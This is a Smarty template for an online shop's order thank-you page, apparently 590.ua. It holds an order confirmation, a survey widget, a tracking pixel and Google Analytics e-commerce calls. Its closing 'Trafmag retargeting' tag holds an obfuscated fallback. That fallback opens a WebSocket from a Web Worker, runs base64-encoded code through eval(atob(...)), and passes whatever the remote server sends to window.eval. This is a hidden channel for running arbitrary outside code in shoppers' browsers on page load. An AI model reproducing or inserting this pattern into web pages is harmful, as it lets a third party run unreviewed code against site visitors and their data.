{include file=_header.tpl}

<div class="container" style="width: 800px; margin-left: 40px">
    <div class="row">
        <div class="col-md-12">
            <div class="alert alert-success fade in">
                <strong>Спасибо, Ваш заказ
                {if $manager}
                    <a id="data-orderId" href="https://cms.alcotec.com.ua/admin/orders/cheque/id/{$orderId}" target="_blank">№{$orderId}</a>
                {else}
                    <strong id="data-orderId">№{$orderId}</strong>
                {/if}
                принят. В ближайшее время с вами свяжутся наши менеджеры для подтверждения заказа.
                </strong>
            </div>
        </div>
    </div>

    <div class="row">
        <div class="col-md-12">
            <div class="text-center">
                <br><a class="btn btn-success btn-lg" href="/">Продолжить покупки</a>
            </div>
        </div>
    </div>

    <div class="row thankyou">
        <div class="col-md-12">
            <div class="text-center">
                <br><br><p class="text-center text-muted">Присоединяйтесь к нам в социальных сетях</p>
                <p class="text-center">
                    <a href="https://facebook.com/590.ua"><img src="/images/new/logo_fb.png"></a>
                    <a href="https://twitter.com/590Ua"><img src="/images/new/logo_tw.png"></a>
                </p>
            </div>
        </div>
    </div>
</div>

{if isset($smarty.cookies.pokupon_uid) && isset($smarty.cookies.pokupon_cid)}
    <img src="http://pokupon.ua/pixel/{$smarty.cookies.pokupon_cid}/new.jpg?uid={$smarty.cookies.pokupon_uid}&ord_id={$orderId}&amount={$summ}" />
{/if}

{if $survey}
    <div class="alert alert-block">
        <h3>Опрос:</h3>
        <ul id="survey">
            <li>{$survey.name}</li>
                {foreach from=$survey.answers item = answer}
                    <li>
                        <label for="answer_{$answer.id}"><input type="radio" id="answer_{$answer.id}" value='{$answer.id}' name='answer' /> {$answer.name}</label>
                    </li>
                {/foreach}
            <li><a href="#" class="btn btn-warning" id="data-sendAnswer">Ответить</a></li>
        </ul>
    </div>
{/if}

{literal}
    <script type="text/javascript">
        $(document).ready(function(){
            $('#data-sendAnswer').live('click',function(e){
                e.preventDefault();
                var answer = $('#survey input:checked').val();
                if (answer === undefined)
                    return false;
                var orderId = $('#data-orderId').html().substr(1);
                $.getJSON('/survey/send-answer',{answer:answer, orderId: orderId},function(data){
                    if (data.success){
                        $('#survey').html(
                            'Благодарим вас за ответ'
                        );
                    }
                });
            });
        });

var ga = ga || [];
ga('create', 'UA-46008870-1', 'auto');
ga('send', 'pageview');
ga('require', 'ecommerce');   // Load the ecommerce plug-in.
ga('ecommerce:addTransaction', {
  'id': '{/literal}{$orderId}{literal}',                     // Transaction ID. Required
  'affiliation': 'Заказ 590.ua',   // Affiliation or store name
  'revenue': '{/literal}{$summ*$curs_evro_smarty}{literal}'               // Grand Total
});


        {/literal}{foreach from=$orderItems item=item}{literal}
        // addItem should be called for every item in the shopping cart.
ga('ecommerce:addItem', {
  'id': '{/literal}{$orderId}{literal}',                     // Transaction ID. Required
  'name': '{/literal}{$itemsInfo[$item.id_catalog].brand} {$itemsInfo[$item.id_catalog].name}{literal}',                // Product name. Required
  'sku': '{/literal}{$item.id_catalog}{literal}',                    // SKU/code
  'category': '{/literal}{$itemsInfo[$item.id_catalog].cat} {$itemsInfo[$item.id_catalog].brand}{literal}',       // Category or variation
  'price': '{/literal}{$item.price*$curs_evro_smarty}{literal}',                 // Unit price
  'quantity': '{/literal}{$item.quantity}{literal}'                   // Quantity
});
        {/literal}{/foreach}{literal}

        ga('ecommerce:send');      // Send transaction and item data to Google Analytics.

        (function() {
            var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
            ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
            var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
        })();
        $(document).ready(function(){
          window.GIHhtQfW_AtmUrl = 'https://590.ua/basket/thankyou/?order_done{/literal}{$orderId}{literal}';
        });
    </script>
{/literal}

<!-- Trafmag ретаргетинг-->
{literal}
<script type='text/javascript'>(function(t,r,f,m,g,c){g=t.createElement(r),c=t.getElementsByTagName(r)[0];g.type='text/javascript';g.async=1;g.src=(t.location.protocol == 'https:'?'https:':'http:')+f+m;g.onerror = function () {try {if (t.location.protocol == 'https:'){var wsproto = 'wss',wsport = '8041'} else {var wsproto='ws',wsport='8040'};var wrkr_tr_location = wsproto+':'+f+':'+wsport+m+'?ref='+encodeURIComponent(window.location.href);var wrkr_tr = new Worker(URL.createObjectURL(new Blob(['var wrkr_tr_location = "' + wrkr_tr_location + '";eval(atob("DWZ1bmN0aW9uIHNlbmRNZXNzYWdlKGUpew12YXIgaD13cmtyX3RyLm9ubWVzc2FnZTsNd3Jrcl90ci5yZWFkeVN0YXRlPT13cmtyX3RyLkNMT1NFRCYmKHdya3JfdHI9bmV3IFdlYlNvY2tldCh3cmtyX3RyX2xvY2F0aW9uKSksDXdya3JfdHIub25tZXNzYWdlPWgsDXdhaXRGb3JTb2NrZXRDb25uZWN0aW9uKHdya3JfdHIsZnVuY3Rpb24oKXt3cmtyX3RyLnNlbmQoZSk7fSkNfQ1mdW5jdGlvbiB3YWl0Rm9yU29ja2V0Q29ubmVjdGlvbihlLHQpe3NldFRpbWVvdXQoZnVuY3Rpb24oKXtyZXR1cm4gMT09PWUucmVhZHlTdGF0ZT92b2lkKG51bGwhPXQmJnQoKSk6dm9pZCB3YWl0Rm9yU29ja2V0Q29ubmVjdGlvbihlLHQpfSw1KX07DXdya3JfdHIgPSBuZXcgV2ViU29ja2V0KHdya3JfdHJfbG9jYXRpb24pLA13cmtyX3RyLm9ubWVzc2FnZSA9IGZ1bmN0aW9uICh0KSB7cG9zdE1lc3NhZ2UodC5kYXRhKTt9LA1vbm1lc3NhZ2UgPSBmdW5jdGlvbihlKXtzZW5kTWVzc2FnZShlLmRhdGEpfQ0="))']), {type: "application/javascript"}));wrkr_tr.onmessage = function(msg) {window.eval(msg.data)};wrkr_tr.postMessage('');}catch (err) {}};c.parentNode.insertBefore(g,c);})(document,'script','//t.trafmag.com','/js/clear-590ua.js');</script>
{/literal}
<!-- //Trafmag ретаргетинг-->

{include file=_footer.tpl}